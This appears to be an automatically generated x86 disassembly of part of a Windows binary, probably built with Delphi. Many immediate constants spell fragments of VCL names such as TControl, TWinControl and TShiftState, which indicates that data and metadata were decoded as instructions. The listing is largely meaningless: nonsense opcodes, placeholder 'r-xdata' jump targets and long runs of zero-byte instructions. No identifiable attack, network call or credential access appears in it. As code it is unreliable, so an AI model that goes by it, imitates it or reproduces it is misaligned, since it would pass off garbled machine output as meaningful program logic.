xor al 0x43
add [ edi + edi ] bh
inc ebx
add [ eax ] cl
or eax 0x646e4554
inc esp
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
je r-xdata
je r-xdata
je r-xdata
inc esp
jb r-xdata
hlt
outsb
je r-xdata
inc ebp
jbe r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ebx ] eax
dec ebx
jns r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
dec ecx
add [ eax + 0x7 ] ebx
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
jb r-xdata
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
outsb
je r-xdata
push esp
inc ebp
outsb
jb r-xdata
add ah dh
adc [ eax ] al
sub [ eax ] dl
inc eax
add [ ebp + 0x3e0c0040 ] cl
inc ebx
add [ eax ] cl
push cs
push esp
inc ebx
push 0xf4007261
adc [ eax ] al
pop es
inc edx
outsd
outsd
insb
popad
jb r-xdata
inc ebp
jbe r-xdata
or [ edx ] ecx
inc esp
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0xa ] si
cmp al 0x10
inc eax
add [ eax + edx ] bh
inc eax
add [ ebp + 0x3ef40040 ] cl
inc ebx
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
popad
jb r-xdata
jbe r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add al 0x8
push es
push ebx
outsb
jb r-xdata
hlt
pop es
dec ecx
outsb
je r-xdata
inc esp
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
outsb
je r-xdata
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
outsb
je r-xdata
outsb
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx + 0x54 ] si
inc esp
jb r-xdata
or [ esi ] al
outsb
je r-xdata
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
or [ esi ] al
push esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
outsb
je r-xdata
pop eax
add [ ecx ] al
push esp
dec edi
push ebx
outsb
jb r-xdata
add cl [ eax ]
push es
jb r-xdata
jb r-xdata
adc [ eax ] al
cmp al 0x10
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + 0x800433f ] bl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax - 0xc ] si
adc [ eax ] al
push ebx
outsb
add al 0x8
push es
jb r-xdata
jb r-xdata
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
inc esp
outsd
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
hlt
hlt
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
jo r-xdata
or [ esi ] al
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsd
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add [ ecx + 0x7 ] ebx
dec ecx
or [ esp + edx * 2 ] cl
inc esp
outsd
outsb
je r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jbe r-xdata
inc esp
outsd
insb
jb r-xdata
popad
jb r-xdata
outsb
je r-xdata
jbe r-xdata
inc ebp
jbe r-xdata
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61430701
imul esi [ ebp + 0x49 ] 0x456f666e
jbe r-xdata
push 0x65
popad
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
push ebx
je r-xdata
je r-xdata
inc esp
outsd
arpl [ ebx + 0x45 ] bp
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
hlt
outsb
je r-xdata
inc ebx
jpe r-xdata
call sub_438509
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
aam 0x41
inc ebx
add [ eax ] cl
andps xmm0 [ ebx + 0x61 ]
outsb
push edx
jae r-xdata
outsb
je r-xdata
outsb
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edi + ecx + 0x54 ] si
inc esp
jb r-xdata
je r-xdata
or [ ecx ] cl
dec esi
ja r-xdata
je r-xdata
jne r-xdata
adc [ 0x6c666e49 ] ecx
push esp
inc ebx
outsd
outsb
je r-xdata
outsd
arpl [ ebx + 0x43 ] bp
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsb
je r-xdata
inc eax
add [ eax + edx ] bh
jb r-xdata
pop ss
push esp
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
pop es
outsb
arpl [ ebp + 0x52 ] sp
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + edx + 0x8 ] si
dec ebp
outsd
add eax 0x63655254
je r-xdata
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax - 0xc ] si
adc [ eax ] al
nop
aaa
inc ebx
add [ eax + 0x41 ] cl
inc ebx
add [ eax ] cl
adc [ edi + eax * 2 + 0x65 ] edx
je r-xdata
inc esp
add [ 0x6f6c6c41 ] eax
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
outsd
insb
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x43435cc0 ] cl
push edi
push 0x456c6565
jbe r-xdata
push 0x6e490774
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] 0x6e657645
outsd
outsb
jae r-xdata
outsb
je r-xdata
or [ edx ] cl
inc esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0xa ] si
jae r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
imul esp [ edi + 0x68 ] 0x6e490774
push eax
outsd
jae r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x7 ] bp
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
add [ edi ] eax
inc ebx
popad
jne r-xdata
or [ ebp + 0x6f ] cl
add ah dh
adc [ eax ] al
call 0xffffffffc0438437
dec esi
inc ebx
add [ eax ] al
adc [ eax ] al
cld
inc eax
inc ebx
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
inc edx
outsd
outsd
insb
popad
outsb
ja r-xdata
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x45 ] bp
pop es
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
nop
aaa
inc ebx
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + 0x3a ] dl
inc ebx
add [ eax ] al
adc [ eax ] al
nop
nop
inc eax
inc ebx
add [ eax ] cl
or al 0x54
inc esp
jb r-xdata
or [ edx ] ecx
arpl [ ecx + ecx + 0xa ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
je r-xdata
push edi
push 0x556c6565
add [ eax ] cl
push ss
push esp
dec ebp
outsd
jne r-xdata
add [ eax + edx ] bh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
pop esp
inc ebx
inc ebx
outsb
jb r-xdata
jb r-xdata
add eax 0x65530608
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ ebx + 0x4342d4c0 ] cl
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x6f ] dl
jne r-xdata
adc [ eax ] al
cmp al 0x10
jpe r-xdata
dec esi
ja r-xdata
or [ esi + 0x65 ] ecx
ja r-xdata
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] bl
inc ebp
inc ebx
js r-xdata
insb
outsd
ja r-xdata
add eax 0x65530608
outsb
jb r-xdata
add [ edi ] eax
dec eax
popad
or [ ebp + 0x6f ] cl
jne r-xdata
hlt
add [ eax ] ecx
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
pop es
dec ecx
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
dec esi
ja r-xdata
add [ eax ] ecx
push esp
dec edi
add [ eax + edx ] bh
inc ebp
jbe r-xdata
inc ebp
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push edx
jae r-xdata
push es
inc ebx
add [ esp + eax * 4 ] ch
add [ ebx + ebp * 4 ] dh
inc ebx
add [ edi + ebx * 4 ] ch
inc ebx
add [ eax + 0x3d ] dl
inc ecx
add ah bh
stosb [ edi ]
inc ebx
add [ eax ] dl
jg r-xdata
add [ eax ] al
js r-xdata
push eax
outsd
jo r-xdata
jne r-xdata
inc ebp
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
adc [ gs : eax ] cl
push eax
outsd
jae r-xdata
je r-xdata
outsb
je r-xdata
outsb
add [ eax ] ecx
je r-xdata
dec ecx
outsb
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
je r-xdata
jpe r-xdata
add al [ eax ]
add [ eax ] al
add al dl
jl r-xdata
inc ebx
add al bh
lodsb [ esi ]
inc ebx
add [ eax ] dl
mov [ ebx ] al
dec eax
jle r-xdata
add [ esi + edi * 2 + 0x43 ] bh
add [ eax ] ch
mov [ ebx ] al
call 0xffffffffbc43862d
xchg ebp eax
inc ecx
add [ ebp + edx * 4 - 0x670fffbf ] dh
inc ecx
add [ eax + 0x7b ] al
inc ebx
add ah al
cdq
inc ebx
add al al
cdq
inc ebx
add [ eax - 0x7bffbc66 ] dl
jge r-xdata
inc ebx
inc ecx
add al dl
cwde
inc ecx
add [ esp + esi - 0x6defffc0 ] dl
inc ecx
add [ esp + esi - 0x61abffc0 ] bl
inc ebx
add al dh
xor [ eax ] eax
or al 0x32
jo r-xdata
add [ eax + 0x20 ] bh
inc ebp
js r-xdata
outsb
je r-xdata
add [ edx ] cl
push edi
push 0x446c6565
insb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
jo r-xdata
je r-xdata
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebp + 0x44740040 ] cl
push eax
outsd
jae r-xdata
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
cmp al 0xe
inc ecx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] cl
push 0x6e490774
pop es
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
cmp al 0x10
inc eax
add [ eax + edx ] bh
inc eax
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
inc esp
inc edx
inc ebx
add [ eax ] cl
xchg esp eax
adc [ eax ] al
add [ eax ] 0x0
add [ eax + edx + 0x1540040 ] dl
add [ eax ] al
add ah cl
lodsb [ esi ]
dec ebx
add [ ecx ] al
add ah [ ecx + 0x7020400 ]
add [ ecx + ecx * 4 - 0x76ebffbd ] bl
inc ebx
add [ eax ] ch
mov [ ebx ] es
aam 0x8a
inc ebx
add al al
pushfd
inc ebx
add [ ebp + ebp * 4 + 0x43 ] bh
add [ edi + ecx * 4 ] dl
inc ebx
add [ eax - 0x3ffbc71 ] cl
jg r-xdata
inc ebx
add ah bh
inc ebx
add [ ebp + ecx * 4 + 0x43 ] dl
add ah cl
jl r-xdata
add al cl
test [ ebx ] al
sub al 0x84
lea eax [ eax ]
je r-xdata
jbe r-xdata
add dh bl
inc esi
inc ebx
add [ ecx + eax ] bl
outsb
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
jbe r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
cmp al 0xe
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
rol [ ebx + 0x43 ] 0x1
add [ eax ] cl
adc dl [ ebx + eax * 2 + 0x6f ]
outsb
add [ edi ] eax
dec eax
popad
outsb
insb
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] ecx
or eax 0x35b008b0
mov al 0x9
mov al 0x23
mov al 0x30
mov al 0xa
mov al 0x13
mov al 0x14
mov al 0x1c
mov al 0x3a
mov al 0x3c
mov al 0x3d
mov al 0x43
mov al 0x7b
add bh ch
add al [ ebx ]
add al [ esi ]
add cl [ ecx ]
add al [ eax ]
add al [ edx ]
add al [ 0xa020802 ]
add bl [ edi ]
add [ edi ] al
or esi [ eax - 0x4ff14ff4 ]
add [ eax - 0x71 ] ch
inc ebx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x800040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
push esp
add [ eax ] eax
add [ ebx ] cl
add [ edx ] eax
mov eax [ 0x7020400 ]
inc eax
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
inc ebx
add ah ch
inc esi
inc ebx
add [ eax ] al
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
push 0x65
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
adc [ eax ] cl
dec ebp
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx + 0x8 ] si
dec ebp
outsd
jne r-xdata
adc [ eax ] cl
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
add [ eax ] bl
jl r-xdata
push eax
outsd
jae r-xdata
add [ edi ] eax
dec eax
popad
outsb
insb
pop es
inc edx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
sub_4347f4
mov esp 0x9c004383
stosb [ edi ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x480b0009 ] al
insb
jo r-xdata
add [ eax ] al
dec ecx
inc ebx
add [ eax + eax ] ah
add [ eax ] al
clc
cmp [ ebx ] al
mov [ eax + eax * 2 ] dh
add [ esp + esi + 0x34980040 ] dl
inc eax
add [ esp + esi + 0x34900040 ] bl
jns r-xdata
inc ebx
add [ eax ] dl
push eax
inc esp
add [ ecx + edi * 2 ] al
inc ebx
add al dh
cdq
inc ecx
add [ ecx + edi * 2 - 0x65dbffbd ] ah
inc ecx
add [ eax + 0x7a ] dl
inc ebx
add [ ecx + ebx * 4 + 0x41 ] dh
outsd
jb r-xdata
imul ebp [ ebp + 0x43 ] 0x65736f6c
push es
imul ebp [ ebp + 0x4f ] 0xa6e6570
imul ebp [ ebp + 0x44 ] 0x43746e6f
popad
jb r-xdata
add [ eax + 0x15004377 ] ah
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x491cc08b
add [ eax - 0x63ffbbb0 ] cl
push eax
inc esp
add [ eax + 0x79 ] dh
inc ebx
add ah al
push eax
inc esp
add ah cl
jns r-xdata
inc eax
push esp
push cs
inc ecx
add [ eax + 0x1 ] bl
add bh bh
test al 0x83
inc ebx
add [ edx + ebp * 4 + 0x43 ] bl
add [ eax ] al
or al [ eax ]
or ecx [ eax + 0x65 ]
insb
jo r-xdata
add [ esp + edx * 2 ] ecx
or [ ecx + 0x6d ] ch
push ebx
inc ecx
insb
jo r-xdata
inc ebx
add [ ebx ] al
or [ ecx + ecx * 2 + 0x6d ] dl
mov eax eax
sbb al 0x49
add ah cl
push eax
inc esp
add ah ch
jns r-xdata
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ ecx + ebx * 4 - 0x50dfffbf ] bh
xor al 0x40
outsd
outsb
je r-xdata
insb
inc ebp
add [ gs : bx + si ] eax
add [ eax ] al
add [ ebx ] al
jb r-xdata
je r-xdata
popad
pop es
imul ebp [ ebp + 0x41 ] 0x6168706c
push es
imul ebp [ ebp + 0x48 ] 0x7617269
imul ebp [ ebp + 0x53 ] 0x6174614b
push es
imul ebp [ ebp + 0x4b ] 0x9617461
imul ebp [ ebp + 0x43 ] 0x656e6968
jae r-xdata
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
push esp
dec ecx
insd
add ah dl
push eax
inc esp
add [ edi + ebp * 4 + 0x43 ] cl
add al ah
jpe r-xdata
add [ eax ] cl
0x9a5c0041 0x41
nop
js r-xdata
js r-xdata
pop es
bound esp [ ebp + 0x54 ]
outsd
jo r-xdata
dec edx
inc ebx
imul esp [ esp + esi * 2 + 0x68 ] 0x5
add bh bh
add [ eax ] al
add [ edx + ecx * 2 ] bl
inc ebx
add [ esi ] al
bound esp [ ebp + 0x4c ]
je r-xdata
add eax 0x0
dec ecx
inc ebx
add [ esi ] al
bound esi [ esi + 0x4e ]
outsd
outsb
or [ gs : edx + 0x76 ] esp
or ch [ ecx + 0x6d ]
push ebx
dec eax
popad
outsb
jne r-xdata
add [ ebx ] cl
add [ eax ] al
add [ eax ] ah
jpo r-xdata
inc ebx
add [ eax ] bh
push eax
inc esp
add [ edi + ebp * 4 + 0x43 ] al
add [ edx + edi * 2 + 0x43 ] bh
add [ eax ] bh
jns r-xdata
add al 0x79
test [ eax + 0x43 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul esp [ esp + esi * 2 + 0x68 ] 0x105
outsd
insd
or [ ebx + 0x6f ] al
outsb
je r-xdata
inc edx
outsd
je r-xdata
or [ edx + 0x65 ] ah
bound esp [ ebp + 0x52 ]
imul esp [ edi + 0x68 ] 0x65620874
add [ ebx ] al
add [ eax ] al
add [ eax + 0x4a ] bh
inc ebx
add [ esi ] al
bound ebp [ ebx + 0x4e ]
outsd
outsb
push es
bound ebp [ ebx + 0x54 ]
imul ebp [ ebp + 0x6 ] 0x6f536b62
je r-xdata
add [ esi ] al
jb r-xdata
dec esp
outsd
ja r-xdata
or [ edx + 0x76 ] esp
insb
or [ ecx + 0x6d ] ebp
dec eax
popad
outsb
jne r-xdata
add [ eax ] bl
dec ecx
inc ebx
add [ edx + edi * 2 ] cl
inc ebx
add al ch
push eax
inc esp
add ah ch
push eax
inc esp
add [ eax ] dh
jpe r-xdata
add bh bh
add [ eax ] al
outsd
insb
jae r-xdata
or [ ebx + 0x6f ] al
bound ebp [ ebx + 0x46 ]
insb
popad
je r-xdata
add [ eax ] al
insb
inc ebp
jae r-xdata
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
or [ fs : edx + 0x76 ] ah
push edx
popad
imul esi [ ebx + 0x65 ] 0x76620764
push ebx
jo r-xdata
or [ edx + 0x76 ] ah
insb
or [ ebx + 0x6f ] al
outsb
je r-xdata
jbe r-xdata
dec edx
inc ebx
dec esp
inc ebx
add [ edx + 0x400434e ] dh
add al [ eax ]
add [ eax ] ch
inc esp
inc ebx
add al dl
cwde
inc ecx
add [ esp + esi - 0x6defffc0 ] dl
outsd
insb
jae r-xdata
mov eax eax
ror [ edx + 0x43 ] 0x0
add [ ebx ] ecx
push esp
inc edx
jbe r-xdata
outsb
je r-xdata
inc ebx
outsd
dec edx
inc ebx
add [ ebx + 0x434a7cc0 ] cl
add [ ebx ] al
or dl [ edx + eax * 2 + 0x65 ]
jbe r-xdata
sbb al 0x4a
add [ edx + ecx * 2 ] ebx
arpl [ ebp + 0x8 ] sp
inc ebx
outsd
outsb
je r-xdata
outsd
insb
jae r-xdata
inc ecx
add [ esp + esi - 0x325fffc0 ] bl
inc ebx
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax - 0x50 ] bh
inc ebx
add [ eax - 0x3 ] al
inc ebx
add [ eax - 0x3b ] ch
inc ebx
add [ eax + 0x3d ] dl
inc ecx
add ah bh
stosb [ edi ]
inc ebx
add [ eax ] dl
jg r-xdata
mov dl 0x4e
inc ebx
add [ edx + eax ] al
add [ eax ] al
sub [ ebx + eax * 2 ] al
rcr [ eax + 0x34940041 ] 0x1
inc eax
add [ eax ] dl
xchg edx eax
insb
push edi
inc ebx
add al bh
lodsb [ esi ]
inc ebx
add [ eax ] dl
mov [ ebx ] al
dec eax
jle r-xdata
add [ edx + esi * 4 ] bl
inc ebx
add [ eax ] ch
mov [ ebx ] al
call 0xffffffffbc438d11
xchg ebp eax
inc ecx
add [ ebp + edx * 4 - 0x670fffbf ] dh
rol al 0x4a
inc ebx
add [ ecx ] al
or edx [ edx + eax * 2 + 0x65 ]
jb r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] 0x1
add [ eax ] al
outsd
insb
jae r-xdata
add [ ecx ] cl
imul ebp [ ebp + 0x44 ] 0x62617369
insb
pop es
inc edx
outsd
jb r-xdata
shr [ ecx + ecx * 2 + 0x80a0043 ] 0x54
inc ebx
add [ edi + eax * 8 + 0x43 ] ah
add [ esi + eax * 8 ] bl
inc ebx
add ah al
lds eax [ ebx ]
cmp al 0xf2
inc ebx
add [ eax + edx * 8 ] cl
inc ebx
add [ eax ] dh
add al 0x44
add [ eax - 0x57ffbc12 ] bh
int1
inc ebx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add al bl
dec edx
inc ebx
add [ ecx + eax ] bh
add [ eax - 0x77ffbcb7 ] ch
add [ eax ] eax
add [ ecx ] ch
lldt [ ecx ]
add [ esi ] ecx
adc eax 0x15011400
add [ ecx ] edi
add [ 0x2c002b00 ] ch
add [ eax + eax ] dl
inc edi
add [ esi ] al
add eax 0x20000300
add [ eax ] al
add [ ecx + eax ] eax
add [ ecx ] eax
add eax 0x12010201
add [ edi ] ebp
add [ eax ] dl
add ch [ esi ]
add [ edx ] al
add [ ebx - 0x7bff7e00 ] al
add [ ebp + 0x11030f00 ] al
add ebx [ edx ]
add [ 0x7001e00 ] bl
add [ eax ] cl
add [ 0x7b010e01 ] cl
add [ edi ] dh
mov al 0x2e
mov al 0x5
mov al 0x6
mov al 0x7
mov al 0xb
mov al 0xc
mov al 0xd
mov al 0xe
mov al 0x3b
mov al 0xf
mov al 0x10
mov al 0x11
mov al 0x19
mov al 0x22
mov al 0x1a
mov al 0x1b
mov al 0x1c
mov al 0x24
mov al 0x35
mov al 0x25
mov al 0x26
mov al 0x27
mov al 0x2f
mov al 0x0
mov ebp 0xbd02bd01
add al 0xbd
push es
mov ebp 0xb033b02c
xor al 0xb0
cmp [ eax - 0x4fc54fc7 ] dh
cmp al 0xb0
sbb [ ebx ] al
out dx eax
add [ ecx + ecx * 4 - 0x76ebffbd ] bl
inc ebx
add [ eax ] ch
mov [ ebx ] es
aam 0x8a
inc ebx
add [ esp + ecx * 8 ] bh
inc ebx
add [ ebp + ebp * 4 + 0x43 ] bh
add [ eax + esi * 8 + 0x43 ] bl
add [ eax ] bl
int1
inc ebx
add [ esp + ebp * 8 ] dl
inc ebx
add ah bh
or [ ebx + 0x6f ] al
outsb
je r-xdata
adc [ eax ] eax
add [ ecx - 0x3 ] edi
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0x4308e870 ] eax
outsd
dec ecx
insd
dec esi
popad
insd
mov eax eax
mov esp 0x1004349
or al 0x54
or cl [ eax ]
push esp
add [ ebx ] al
or dl [ edx + eax * 2 + 0x65 ]
jbe r-xdata
and [ edx + 0x43 ] cl
inc ecx
add [ edi + ebp * 4 + 0x43 ] dl
add [ eax + edi * 8 + 0x43 ] dl
add [ eax - 0x3 ] dh
inc ebx
add [ esp + edi * 8 + 0x7d840043 ] bh
inc ebx
add al dl
inc ebx
add al dh
inc ebx
add [ eax ] cl
add [ ebp + edx * 4 - 0x6a4bffbf ] bh
inc ecx
add al dh
cwde
outsd
insb
jae r-xdata
add [ eax ] al
add [ eax ] al
and [ ebx + eax * 2 ] cl
les ecx [ esi + 0x43 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] bh
add bh bh
[ eax + 0x4b ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
dec esp
inc ebx
add ah al
dec esi
inc ebx
sub_434d04
mov eax 0xb6ffb7ff
push [ ebp - 0x47004b01 ]
rol [ ebx ] cl
sbb ch dl
inc ebx
add [ eax ] bh
aad 0x43
add [ ebp + edx * 8 + 0x43 ] bl
add [ ebp + edx * 8 - 0x2a33ffbd ] ch
inc ebx
add ah ch
aad 0x43
add [ eax ] dl
salc
inc ebx
add [ esi + edx * 8 ] dh
inc ebx
add [ eax - 0x2a ] bl
inc ebx
add [ esi + edx * 8 + 0x43 ] bh
add [ edi + edx * 8 ] al
inc ebx
add ah al
xlat
inc ebx
add [ eax + ebx * 8 ] dl
inc ebx
add [ eax - 0x28 ] cl
inc ebx
add [ eax + ebx * 8 + 0x43 ] bl
add ah ah
loopne r-xdata
inc ebx
add [ ebp + edx * 8 - 0x26a3ffbd ] bl
add [ eax ] dl
loope r-xdata
add [ eax - 0x27 ] dh
inc ebx
add [ ecx + ebx * 8 + 0x43 ] bl
add ah cl
loope r-xdata
inc ebx
add ah ch
loope r-xdata
inc ebx
add [ ecx + ebx * 8 - 0x2667ffbd ] al
add [ eax + 0x600043e2 ] dl
jecxz r-xdata
inc ebx
add [ eax ] ch
add eax [ eax + eax + 0x7c ]
out 0x43 al
add [ eax - 0x5bffbc1a ] dl
out 0x43 al
add [ esi - 0x194bffbd ] ch
inc ebx
add [ esi - 0x18ebffbd ] bh
inc ebx
add [ edi + 0x43 ] bl
add [ edi - 0x17ffffbd ] al
inc ebx
add al al
out 0x43 eax
add [ eax - 0x18 ] al
inc ebx
add [ eax - 0x13ffbc18 ] al
out 0x43 al
add [ ebp - 0x1a23ffbd ] cl
inc ebx
add [ eax - 0x1a ] dl
inc ebx
add [ esi + 0x43 ] bl
add al al
call 0xffffffffe9934e3f
inc ebx
add al cl
call 0xffffffffe9134e47
inc ebx
add al bl
call 0xffffffffe9234e4f
inc ebx
add [ eax ] al
0xeae40043 0x43
add [ eax ] cl
in al 0x43
add [ eax ] ch
in al 0x43
add [ esp + 0x43 ] bl
add [ esp + 0x43 ] bh
add al dh
inc [ ebx ]
mov al 0xe4
inc ebx
add ah cl
in al 0x43
add [ eax + 0x48004400 ] al
in eax 0x43
add [ ebp + 0x43 ] ch
add [ eax - 0x2b ] bh
inc ebx
add [ ebp + edx * 8 - 0x2a63ffbd ] cl
sub_4352e4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x53
inc ebx
add [ eax ] ch
add [ eax ] al
add [ eax - 0x77ffbff0 ] ah
xor al 0x40
add [ esp + esi + 0x34980040 ] dl
inc eax
add [ esp + esi + 0x34900040 ] bl
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ ecx ] cl
push esp
inc esp
outsd
arpl [ ebx + 0x5a ] bp
outsd
outsb
mov eax eax
int3
sub_4353d4
mov ah 0x53
inc ebx
add [ esi - 0x37ffbcad ] bh
push ebx
inc ebx
add [ ecx ] bh
push ebx
inc ebx
add [ ecx + 0x53 ] al
inc ebx
add [ ecx + 0x53 ] cl
inc ebx
add [ ecx + 0x53 ] dl
inc ebx
add [ esi + 0x53 ] bl
inc ebx
add [ ebx + 0x53 ] ch
inc ebx
add [ eax + 0x53 ] bh
inc ebx
add [ ebp - 0x6dffbcad ] al
push ebx
inc ebx
add [ edi - 0x53ffbcad ] bl
push ebx
inc ebx
add [ ecx ] al
add [ eax ] al
add [ ecx - 0x3 ] bh
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0x53d4e870 ] eax
inc ebx
add [ eax + eax ] dh
add [ eax ] al
add [ eax ] al
